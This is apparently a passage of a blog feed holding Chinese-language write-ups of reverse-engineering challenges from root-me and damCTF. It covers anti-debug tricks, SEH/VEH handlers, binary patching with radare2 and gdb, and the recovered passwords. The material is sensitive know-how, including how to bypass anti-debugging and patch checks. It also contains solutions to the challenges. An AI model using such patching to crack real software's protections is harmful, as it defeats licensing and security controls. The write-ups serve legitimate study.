class="headerlink" title="memcpy"></a>memcpy</h3><pre><code>void * memcpy ( void * destination, const void * source, size_t num );</code></pre><p>表示将0x400ac0的141个字节拷贝到新开辟的虚拟空间中0x7ffff7ffb000</p><p>0x4008b6:    mov    rcx,QWORD PTR [rip+0x2007c3]        # 0x601080<br>rcx==0x3148c93148c03148</p><hr><h3 id="r2"><a href="#r2" class="headerlink" title="r2"></a>r2</h3><p><code>help x</code><br>命令：x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示输出三个单位，u表示按十六进制显示。</p><p><code>gdb-peda$ x/141xb 0x400ac0</code></p><hr><h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>pid_t fork(void)<br>fork系统调用用于创建一个新进程，称为子进程，它与进程（称为系统调用fork的进程）<code>同时运行</code>，此进程称为父进程。创建新的子进程后，两个进程将<code>执行</code>fork（）系统调用之后的<code>下一条指令</code>。</p><p>返回值： 若成功调用一次则返回两个值，<code>子进程返回0</code>，<code>父进程返回子进程ID</code>；否则，出错返回-1</p><p>这意味着父子进程间不共享这些<code>存储空间</code>。</p><hr><pre><code>0x4008d1:    call   0x400630 &lt;fork@plt&gt;</code></pre><p>调用后返回0， 则当前的子进程</p><hr><p><del>gdb catch 捕获异常</del></p><h3 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid"></a>waitpid</h3><p>作用同于wait，但可指定pid进程清理，可以不阻塞。</p><p><code>pid_t waitpid(pid_t pid,int *status,int options);</code>成功：返回清理掉的子进程ID；失败：-1（无子进程）</p><ul><li>pid&gt;0    只等待进程ID等于pid的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，waitpid就会一直等下去。</li></ul><ul><li>参数status如果不是一个空指针,则终止进程的终止状态就存放在status所指向的单元。</li></ul><hr><h3 id="SAR"><a href="#SAR" class="headerlink" title="SAR"></a>SAR</h3><p>SAR 算术右移指令<br>符号位保持不变</p><p>call rax 如果都不跳转，则到这里<br>0x7ffff7ffb07b:    mov    al,0x3c<br>   0x7ffff7ffb07d:    mov    edi,0x0<br>   0x7ffff7ffb082:    syscall </p><h2 id="没有解出来-tw-1f198-worried"><a href="#没有解出来-tw-1f198-worried" class="headerlink" title="没有解出来:tw-1f198::worried:"></a>没有解出来:tw-1f198::worried:</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x64-Nanomites-Introduction&quot;&gt;&lt;a href=&quot;#ELF-x64-Nanomites-Introduction&quot; class=&quot;headerlink&quot; title=&quot;ELF x64 - Nanomites - Introduction&quot;&gt;&lt;/a&gt;ELF x64 - Nanomites - Introduction&lt;/h2&gt;&lt;h3 id=&quot;mmap&quot;&gt;&lt;a href=&quot;#mmap&quot; class=&quot;headerlink&quot; title=&quot;mmap&quot;&gt;&lt;/a&gt;mmap&lt;/h3&gt;&lt;p&gt;&lt;del&gt;mmap只是在虚拟内存分配了地址空间，只有在第一次访问虚拟内存的时候才分配物理内存。&lt;/del&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - Anti-debug</title>
    <link href="http://finsenty54.github.io/2020/10/23/ELF%20x86%20-%20Anti-debug/"/>
    <id>http://finsenty54.github.io/2020/10/23/ELF%20x86%20-%20Anti-debug/</id>
    <published>2020-10-23T13:38:58.000Z</published>
    <updated>2020-10-31T08:53:12.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-Anti-debug"><a href="#ELF-x86-Anti-debug" class="headerlink" title="ELF x86 - Anti-debug"></a>ELF x86 - Anti-debug</h2><p>参考<a href="https://re.kv.io/crackme/12.html">https://re.kv.io/crackme/12.html</a><br><code>int 80</code> 系统调用<br><code>32位</code>下，<code>EAX</code>保存调用号<br><del>mov eax , 30  utime, utimes - change file last access and modification times<br>int utime(const char *filename, const struct utimbuf *times);</del></p><p><del>The utime() system call changes the access and modification times of<br>the inode specified by filename to the actime and modtime fields of<br>times respectively.</del></p><a id="more"></a><hr><p>上面是错的<br>0x30 as sys_signal 十六进制 <code>直接弄错</code><br>0x30 == 48</p><pre><code>void (*signal(int sig, void (*func)(int)))(int)</code></pre><p><code>sys_signal</code>设置一个函数来处理信号，即<strong>带有 sig 参数的信号处理程序</strong><br><code>sig </code>– 在信号处理程序中作为变量使用的信号码<br><code>0x5</code> ==<code>SIGABRT</code>    (Signal Abort) 程序异常终止。<br><code>func</code> – 一个指向函数的指针。它可以是一个由程序定义的函数</p><hr><p><code>int3</code> would cause a debugger to stop</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">08048063</span> loc_8048063:                            ; CODE XREF: start↑j</span><br><span class="line">.text:<span class="number">08048063</span>                 mov     eax, <span class="number">30</span>h</span><br><span class="line">.text:<span class="number">08048068</span>                 mov     ebx, <span class="number">5</span></span><br><span class="line">.text:<span class="number">0804806</span>D                 mov     ecx, offset sub_80480E2</span><br><span class="line">.text:<span class="number">08048072</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_signal</span><br><span class="line">.text:<span class="number">08048074</span>                 jmp     <span class="keyword">short</span> loc_8048077</span><br><span class="line">.text:<span class="number">08048074</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048076</span>                 db <span class="number">0</span>CEh</span><br><span class="line">.text:<span class="number">08048077</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048077</span></span><br><span class="line">.text:<span class="number">08048077</span> loc_8048077:                            ; CODE XREF: start+<span class="number">14</span>↑j</span><br><span class="line">.text:<span class="number">08048077</span>                 <span class="keyword">int</span>     <span class="number">3</span>               ; Trap to Debugger</span><br><span class="line">.text:<span class="number">08048078</span>                 jmp     <span class="keyword">short</span> loc_804807B</span><br></pre></td></tr></table></figure><p>先设置第一个signal处理函数，在<code>0x08048077</code>处遇到<code>int 3</code>跳到处理函数</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">080480E2</span></span><br><span class="line">.text:<span class="number">080480E2</span> sub_80480E2     proc near               ; DATA XREF: start+D↑o</span><br><span class="line">.text:<span class="number">080480E2</span>                 mov     eax, offset sub_8048104</span><br><span class="line">.text:<span class="number">080480E7</span>                 jmp     <span class="keyword">short</span> loc_8048101</span><br><span class="line">.text:<span class="number">080480E9</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480E9</span></span><br><span class="line">.text:<span class="number">080480E9</span> loc_80480E9:                            ; CODE XREF: sub_80480E2:loc_80480FF↓j</span><br><span class="line">.text:<span class="number">080480E9</span>                                         ; sub_80480E2:loc_8048101↓j</span><br><span class="line">.text:<span class="number">080480E9</span>                 cmp     eax, <span class="number">80482E8</span>h</span><br><span class="line">.text:<span class="number">080480</span>EE                 jz      <span class="keyword">short</span> locret_8048103</span><br><span class="line">.text:<span class="number">080480F</span>0                 jmp     <span class="keyword">short</span> loc_80480F3</span><br><span class="line">.text:<span class="number">080480F</span>0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>2                 db <span class="number">0E8</span>h</span><br><span class="line">.text:<span class="number">080480F</span>3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>3</span><br><span class="line">.text:<span class="number">080480F</span>3 loc_80480F3:                            ; CODE XREF: sub_80480E2+E↑j</span><br><span class="line">.text:<span class="number">080480F</span>3                 <span class="keyword">xor</span>     dword ptr [eax], <span class="number">8048F</span>C1h</span><br><span class="line">.text:<span class="number">080480F</span>9                 add     eax, <span class="number">4</span></span><br><span class="line">.text:<span class="number">080480F</span>C                 jmp     <span class="keyword">short</span> loc_80480FF</span><br><span class="line">.text:<span class="number">080480F</span>C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>E                 db <span class="number">0</span>EBh</span><br><span class="line">.text:<span class="number">080480F</span>F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>F</span><br><span class="line">.text:<span class="number">080480F</span>F loc_80480FF:                            ; CODE XREF: sub_80480E2+<span class="number">1</span>A↑j</span><br><span class="line">.text:<span class="number">080480F</span>F                 jmp     <span class="keyword">short</span> loc_80480E9</span><br><span class="line">.text:<span class="number">08048101</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048101</span></span><br><span class="line">.text:<span class="number">08048101</span> loc_8048101:                            ; CODE XREF: sub_80480E2+<span class="number">5</span>↑j</span><br><span class="line">.text:<span class="number">08048101</span>                 jmp     <span class="keyword">short</span> loc_80480E9</span><br><span class="line">.text:<span class="number">08048103</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048103</span></span><br><span class="line">.text:<span class="number">08048103</span> locret_8048103:                         ; CODE XREF: sub_80480E2+C↑j</span><br><span class="line">.text:<span class="number">08048103</span>                 retn</span><br><span class="line">.text:<span class="number">08048103</span> sub_80480E2     endp</span><br></pre></td></tr></table></figure><p>将代码解密出来，然后后面根据signal执行处理代码</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(lambda i: chr(i ^ <span class="number">0xfc</span>), [<span class="number">0xA5</span>, <span class="number">0xCF</span>, <span class="number">0x9D</span>, <span class="number">0xB4</span>, <span class="number">0xDD</span>, <span class="number">0x88</span>, <span class="number">0xB4</span>, <span class="number">0x95</span>, <span class="number">0xAF</span>, <span class="number">0x95</span>, <span class="number">0xAF</span>, <span class="number">0x88</span>, <span class="number">0xB4</span>, <span class="number">0xCF</span>, <span class="number">0x97</span>, <span class="number">0xB9</span>, <span class="number">0x85</span>, <span class="number">0xDD</span>]))</span><br></pre></td></tr></table></figure><p><code>&#39; &#39;</code>字符串内置函数<code>join()</code><br><code>map(fun, iter) </code>函数fun操作iter<br>第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表。<br><code>lambda</code> 声明为匿名函数，如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>(lambda x: x ** <span class="number">2</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br></pre></td></tr></table></figure><hr><h3 id="r2（一个大佬的解法）"><a href="#r2（一个大佬的解法）" class="headerlink" title="r2（一个大佬的解法）"></a><code>r2</code>（一个大佬的解法）</h3><p><code>oo+</code>          reopen in read-write<br><code>wox 0xfc @ entry0+625!18</code>  //会写入 将0xfc与后面18个值异或<br>wox [val]                     ^=  xor  (f.ex: wox 0x90)<br><code>ps @ entry0+625</code><br>ps       print string</p><hr><p><code>wa nop </code>          write nopcode using asm.arch and asm.bits</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x0804060</span>]&gt; wa nop @ <span class="number">0x08048077</span></span><br><span class="line">[<span class="number">0x0804060</span>]&gt; wa mov ecx, <span class="number">0x80482d1</span> @ <span class="number">0x08048167</span></span><br></pre></td></tr></table></figure><p>控制程序流程</p><hr><h3 id="sys-write-−"><a href="#sys-write-−" class="headerlink" title="sys_write −"></a>sys_write −</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">movedx,<span class="number">4</span>; message length</span><br><span class="line">movecx,msg; message to write</span><br><span class="line">movebx,<span class="number">1</span>; <span class="function">file <span class="title">descriptor</span> <span class="params">(<span class="built_in">stdout</span>)</span></span></span><br><span class="line">moveax,4; system call number (sys_write)</span><br><span class="line"><span class="keyword">int</span><span class="number">0x80</span>; call kernel</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-Anti-debug&quot;&gt;&lt;a href=&quot;#ELF-x86-Anti-debug&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Anti-debug&quot;&gt;&lt;/a&gt;ELF x86 - Anti-debug&lt;/h2&gt;&lt;p&gt;参考&lt;a href=&quot;https://re.kv.io/crackme/12.html&quot;&gt;https://re.kv.io/crackme/12.html&lt;/a&gt;&lt;br&gt;&lt;code&gt;int 80&lt;/code&gt; 系统调用&lt;br&gt;&lt;code&gt;32位&lt;/code&gt;下，&lt;code&gt;EAX&lt;/code&gt;保存调用号&lt;br&gt;&lt;del&gt;mov eax , 30  utime, utimes - change file last access and modification times&lt;br&gt;int utime(const char *filename, const struct utimbuf *times);&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;The utime() system call changes the access and modification times of&lt;br&gt;the inode specified by filename to the actime and modtime fields of&lt;br&gt;times respectively.&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>逆向_root_me_4</title>
    <link href="http://finsenty54.github.io/2020/10/19/%E9%80%86%E5%90%91_root_me_4/"/>
    <id>http://finsenty54.github.io/2020/10/19/%E9%80%86%E5%90%91_root_me_4/</id>
    <published>2020-10-19T02:09:51.000Z</published>
    <updated>2020-10-31T08:53:12.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-—-Random-Crackme"><a href="#ELF-—-Random-Crackme" class="headerlink" title="ELF — Random Crackme"></a>ELF — Random Crackme</h2><p>将<code>magic</code>之前的内容都删除，因为之前的垃圾内容，使得不能运行ELF文件<br><code>ELF files start with 7f 45 4c 46</code><br><a href="https://imgchr.com/i/0v8xN8"><img src="https://s1.ax1x.com/2020/10/19/0v8xN8.jpg" alt="0v8xN8.jpg" border="0" /></a></p><a id="more"></a><hr><p><code>r2 -ww ./ch3.bin</code><br><code>-w</code>          open file in write mode<br><code> ww foobar</code>            write wide string ‘f\x00o\x00o\x00b\x00a\x00r\x00’<br> <code>wx 9090</code>     write two intel nops</p><pre><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code></pre><p><code>Short Jump</code>（短跳转）机器码 <code>EB</code></p><hr><p><a href="https://imgchr.com/i/0vGPjs"><img src="https://s1.ax1x.com/2020/10/19/0vGPjs.jpg" alt="0vGPjs.jpg" border="0" /></a></p><p>用time,rand产生随机密码<br>gdb 直接设置<code>eip</code> 跳过代码</p><pre><code>set $eip=xxxx</code></pre><p>再运行<code>c</code></p><hr><pre><code>binwalk crackme_wtf</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r2</span><br><span class="line">aaa</span><br><span class="line">afl <span class="comment">//list function</span></span><br><span class="line">s sym.main</span><br></pre></td></tr></table></figure><h2 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h2><p>str=”break\n”<br>var4=0<br>var8=0xf7<br><code>(MOVSXD r64, r/m32</code> Move doubleword to quadword with sign-extension.<br>这是64位代码中的指令，它将32位寄存器或地址转换为32位值，并将其符号扩展为64位寄存器。 符号扩展采用源的最高位（符号位）的值，并使用它来填充目标的所有高位。)</p><p>var4+str<br>位置加var4<br>(<code>movzx</code>是将源操作数的内容拷贝到目的操作数，并将该值用0扩展至16位或者32位。但是它只适用于无符号整数。 他大致下面的三种格式。)</p><p>str[0]<br><code>MOVSX</code> 指令（进行符号扩展并传送）将源操作数内容复制到目的操作数，并把目的操作数符号扩展到 16 位或 32 位。这条指令只用于有符号整数，</p><p><code>xor (str[0] ,0xa3)=0xf7</code></p><p><code>str[1]</code></p><p><code>cmp eax, 0xf7</code></p><p>注：上篇有自动化代码链接</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-—-Random-Crackme&quot;&gt;&lt;a href=&quot;#ELF-—-Random-Crackme&quot; class=&quot;headerlink&quot; title=&quot;ELF — Random Crackme&quot;&gt;&lt;/a&gt;ELF — Random Crackme&lt;/h2&gt;&lt;p&gt;将&lt;code&gt;magic&lt;/code&gt;之前的内容都删除，因为之前的垃圾内容，使得不能运行ELF文件&lt;br&gt;&lt;code&gt;ELF files start with 7f 45 4c 46&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://imgchr.com/i/0v8xN8&quot;&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/10/19/0v8xN8.jpg&quot; alt=&quot;0v8xN8.jpg&quot; border=&quot;0&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>root_me_PE_x86_SEHVEH_WP</title>
    <link href="http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/"/>
    <id>http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/</id>
    <published>2020-10-13T11:02:38.000Z</published>
    <updated>2020-10-31T08:53:12.112Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PE-DotNet-0-protection"><a href="#PE-DotNet-0-protection" class="headerlink" title="PE DotNet - 0 protection"></a>PE DotNet - 0 protection</h3><p>使用 <code>NET relector</code>工具<br>或者<code>dnSPY</code><br><a href="https://github.com/0xd4d/dnSpy/releases">https://github.com/0xd4d/dnSpy/releases</a><br>就可以破解</p><a id="more"></a><hr><h3 id="ELF-x64-Crackme-automating"><a href="#ELF-x64-Crackme-automating" class="headerlink" title="ELF x64 - Crackme automating"></a>ELF x64 - Crackme automating</h3><p>python 编程</p><p><code>别人写的代码</code><br><a href="https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/">https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/</a></p><p>int([x]) -&gt; integer<br>int(x, base=10) -&gt; integer<br>将数字或字符转为整形<br>Convert a number or string to an integer, or return 0 if no arguments are given. </p><pre><code>num=line[addr+1,-1]byte.append(int (num,16)) //将num变为16进制</code></pre><p>使用<code>pwntools</code> / <code>Capstone</code> /<code>objdump</code> 获得反汇编代码<br>之后进行搜索</p><hr><h3 id="PE-x86-SEHVEH-WP"><a href="#PE-x86-SEHVEH-WP" class="headerlink" title="PE x86 - SEHVEH_WP"></a>PE x86 - SEHVEH_WP</h3><p>从题目知道是关于SEH 和 VEH（VectoredExceptionHandler）的。</p><p><em>OllyDBG 查看seh链 选择 <code>view-seh chain</code></em></p><hr><ol><li><p>在输入后进入主要部分。</p><img src="https://s1.ax1x.com/2020/10/13/0hMvnK.jpg" alt="0hMvnK.jpg" border="0" />这段不是很懂，根据多次调试后判断，如果输入12个字节，则`0xB814A8`处就可以跳转，使`EBP`为0.<img src="https://s1.ax1x.com/2020/10/13/0hQv2n.jpg" alt="0hQv2n.jpg" border="0" />为0，即表示密码正确，会输入成功语句。</li><li><p>接下来是第一部分密码</p><img src="https://s1.ax1x.com/2020/10/13/0hllIe.jpg" alt="0hllIe.jpg" border="0" />`LODS `即将密码头四个字节放入`EAX`中，将`0x5A643059 xor 0x 3628552E `得到第一部分密码，还需反序排列为`weLl`</li><li><p>FS：[0] 为TEB结构体中指向第一个SEH结构体地址</p><img src="https://s1.ax1x.com/2020/10/13/0h1iOP.jpg" alt="0h1iOP.jpg" border="0" /><img src="https://s1.ax1x.com/2020/10/13/0h1fXt.jpg" alt="0h1fXt.jpg" border="0" />即`0xEFFC14`.接着，执行`INT 1`指令后，会进入`0xDB1D60`处的第一个SEH函数。<img src="https://s1.ax1x.com/2020/10/13/0hdwPP.jpg" alt="0hdwPP.jpg" border="0" />SEH函数的第三个参数，即`[ESP+C]`为pContext的地址，pContext保存线程切换时的寄存器信息。在PE 32位下，`+0xB0`为EAX寄存器的值，`0xB81D64`处将`0x48335621`加到`EAX+0xB0`中，保存着输入的第二部分四字节密码。`+0xB8`为EIP寄存器的值，通过下面的判断将EIP值加2，结果为`0xB814E4`，即`INT 1`指令的下一条指令地址。`XOR EAX,EAX`将EAX置0，表示从发生异常的代码处继续执行。<img src="https://s1.ax1x.com/2020/10/13/0hwUL4.jpg" alt="0hwUL4.jpg" border="0" />最后计算如下：`FF2C F8E5 XOR 495F 4265 = B673 BA80 - 48335621 = 6E40 645F=n@d_`反序排列为`_d@n`</li><li><p><code>0xB814FF</code>处调用<code>AddVectoredExceptionHandler</code>函数，新增一个SEH函数。</p><img src="https://s1.ax1x.com/2020/10/13/0h09pV.jpg" alt="0h09pV.jpg" border="0" />以下摘自https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ULONG                       First,</span></span></span><br><span class="line"><span class="function"><span class="params">  PVECTORED_EXCEPTION_HANDLER Handler</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>`First`The order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.如果不为0，则成为第一个调用的SEH函数，从图中可以看到，`First=1`.`Handler`A pointer to the handler to be called. For more information, see VectoredHandler.从图中看出，函数地址为`0xB81940`，`Return value`If the function succeeds, the return value is a handle to the exception handler.If the function fails, the return value is NULL.<img src="https://s1.ax1x.com/2020/10/13/0h0zHH.jpg" alt="0h0zHH.jpg" border="0" />该函数将第三部分的四字节密码减去了一个数，之后，又执行第二个SEH函数。`有个疑问是这里将返回值置0，又怎么执行第二个SEH函数。`最后计算如下：`3C4C7440 xor 74406653 =480C 1213 + 21486553 - 48335621=21212145=!!!E`反序排列为`E!!!`</li><li><p>最后三部分密码组合在一起：<code>weLl_d@nE!!!</code></p><img src="https://s1.ax1x.com/2020/10/13/0hDnsO.jpg" alt="0hDnsO.jpg" border="0" />密码正确</li></ol>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;PE-DotNet-0-protection&quot;&gt;&lt;a href=&quot;#PE-DotNet-0-protection&quot; class=&quot;headerlink&quot; title=&quot;PE DotNet - 0 protection&quot;&gt;&lt;/a&gt;PE DotNet - 0 protection&lt;/h3&gt;&lt;p&gt;使用 &lt;code&gt;NET relector&lt;/code&gt;工具&lt;br&gt;或者&lt;code&gt;dnSPY&lt;/code&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/0xd4d/dnSpy/releases&quot;&gt;https://github.com/0xd4d/dnSpy/releases&lt;/a&gt;&lt;br&gt;就可以破解&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>damCTF- rev/schlage (beginner) __WP</title>
    <link href="http://finsenty54.github.io/2020/10/12/schlage%20(beginner)%20__WP/"/>
    <id>http://finsenty54.github.io/2020/10/12/schlage%20(beginner)%20__WP/</id>
    <published>2020-10-12T08:02:16.000Z</published>
    <updated>2020-10-31T08:53:12.116Z</updated>
    
    <content type="html"><![CDATA[<h2 id="damCTF-rev-schlage-beginner-WP"><a href="#damCTF-rev-schlage-beginner-WP" class="headerlink" title="damCTF- rev/schlage (beginner) __WP"></a>damCTF- rev/schlage (beginner) __WP</h2><ol><li><p>先用<code>file</code>命令查看</p><img src="https://s1.ax1x.com/2020/10/12/0Rkyfe.jpg" alt="0Rkyfe.jpg" border="0" />可以看到是64位的ELF文件,debug信息还在</li><li><p>接着使用radare2反汇编</p><img src="https://s1.ax1x.com/2020/10/12/0RE8xJ.jpg" alt="0RE8xJ.jpg" border="0" /></li></ol><p>使用<code>VV</code>命令进入视图模式</p><a id="more"></a><hr><p>我们的任务是解锁，这里又5把锁<br><img src="https://s1.ax1x.com/2020/10/12/0RVJfS.jpg" alt="0RVJfS.jpg" border="0" /></p><hr><p>关键的代码是这5个函数<br><img src="https://s1.ax1x.com/2020/10/12/0RVIk6.jpg" alt="0RVIk6.jpg" border="0" /></p><hr><h3 id="Pin1"><a href="#Pin1" class="headerlink" title="Pin1"></a>Pin1</h3><p>第三把锁比较简单，来看第一把锁<br><img src="https://s1.ax1x.com/2020/10/12/0RZxKJ.jpg" alt="0RZxKJ.jpg" border="0" /></p><p>也可以在视图模式按<code>o</code>再输入函数旁边的字母<br><img src="https://s1.ax1x.com/2020/10/12/0Rnph6.jpg" alt="0Rnph6.jpg" border="0" /></p><p>这是一个循环操作，共五次，每一次将两个数字异或，最后和<code>0xee</code>比较，相同则成功<br><code>rbp+rax-0x0e</code>即指向开头移入地址的5个数</p><p><code>0x3e xor 0x57 xor 0x81 xor 0xd3 xor 0x 25 xor 0x 93 xor 0xee</code> 结果为0<code>x99</code></p><h4 id="jle："><a href="#jle：" class="headerlink" title="jle："></a>jle：</h4><p>JNB al, bl  ；al里的内容不等于bl时跳转<br>JBE al, bl ；al里的内容小于或等于bl时跳转</p><p>；同理，JGB是大于或等于，<code>JLE是小于或等于</code><br>；A（above）大于，B（below）小于，E（equal）等于，用于比较无符号数<br>；G（great）大于，L（less than）小于， E（equal）等于，用于比较带符号数</p><hr><h3 id="pin5"><a href="#pin5" class="headerlink" title="pin5"></a>pin5</h3><img src="https://s1.ax1x.com/2020/10/12/0RuadA.jpg" alt="0RuadA.jpg" border="0" />#### srand()第5把锁用到了`srand()`和`rand()`两个函数。<p>根据种子产生随机数</p><ol><li>给srand()提供一个种子，它是一个unsigned int类型；</li><li>调用rand()，它会根据提供给srand()的种子值返回一个随机数(在0到RAND_MAX之间)；</li></ol><p>也就是，一个种子，它所产生的随机数是固定的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1111638594</span>； <span class="comment">//0x42424242</span></span><br><span class="line">srand(a); </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><p>输入<code>rand()</code>生成的随机数即可，即为<code>1413036362</code></p><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>lea是“load effective address”的缩写，简单的说，lea指令可以用来将一个内存地址<code>直接</code>赋给目的操作数，例如：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的<code>内存地址里</code>的<code>数据</code>赋给eax。而mov指令则恰恰相反，例如：mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p><hr><h3 id="pin2"><a href="#pin2" class="headerlink" title="pin2"></a>pin2</h3><img src="https://s1.ax1x.com/2020/10/12/0RKg1K.jpg" alt="0RKg1K.jpg" border="0" />查看汇编代码可以知道，pin2根据实际输出了一个种子，根据种子调用`rand() `即可。<p>这个种子下一把锁还要用到，再一次调用<code>rand()</code>，获得的是第二个随机数。</p><hr><h3 id="pin4"><a href="#pin4" class="headerlink" title="pin4"></a>pin4</h3><p>我认为这是最难得了，主要是编程。<br>直接看r2 太复杂，所以我用IDA PRO，然后F5反编译。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your favorite sentence?&quot;</span>);</span><br><span class="line">   fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">   s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;         <span class="comment">//换行符变为0x00</span></span><br><span class="line">   v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">   v1 = <span class="number">0</span>;</span><br><span class="line">   v4 = <span class="built_in">strlen</span>(s);                             <span class="comment">// strlen 